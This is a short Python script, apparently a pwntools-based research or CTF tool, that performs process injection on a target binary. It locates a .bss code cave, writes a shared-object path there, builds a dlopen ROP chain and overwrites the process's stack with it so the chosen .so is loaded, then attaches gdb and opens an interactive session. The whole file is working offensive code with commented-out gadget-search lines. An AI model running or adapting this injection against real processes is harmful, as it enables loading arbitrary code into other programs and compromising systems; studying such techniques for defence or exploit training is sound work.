#!/usr/bin/env python3
import argparse
from exploitutils import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


def parse_args():
    parser = argparse.ArgumentParser(description="[*] process injection on a vulnerable binary.")
    parser.add_argument("binary", help="[*] path to the vulnerable binary.")
    parser.add_argument("so", help="[*] path to the shared object (.so) file.")
    return parser.parse_args()


def inject(user_args):
    target_process = process([user_args.binary])
    gdb.attach(target_process.pid, """source /home/ninpwn/tools/debuggers/pwndbg/gdbinit.py""")

    exploit_utils = ExploitUtils(target_process.pid)
    syscall_info = exploit_utils.parse_proc_syscall()
    log.info(f"current rsp: {hex(syscall_info.rsp)}")

    bss_cave = exploit_utils.find_cave(cave_size=0x100)
    # dlopen_rop_chain = exploit_utils.dlopen_rop(address=bss_cave, so_path=user_args.so)
    dlopen_rop_chain = exploit_utils.dlopen_rop(address=bss_cave, so_path=user_args.so)
    exploit_utils.write_memory(address=bss_cave, content=user_args.so.encode())
    exploit_utils.write_memory(address=syscall_info.rsp, content=dlopen_rop_chain)


    # pop_rsp_gadget = exploit_utils.find_gadget(gadget=asm("pop rsp; ret"), gadget_name="pop_rsp")
    # pop_rbp_gadget = exploit_utils.find_gadget(gadget=asm("pop rbp; ret"), gadget_name="pop_rbp")
    # exploit_utils.write_memory(address=syscall_info.rsp, content=p64(pop_rsp_gadget) + p64(bss_cave))

    target_process.interactive()


def main():
    user_args = parse_args()
    inject(user_args)


if __name__ == "__main__":
    main()
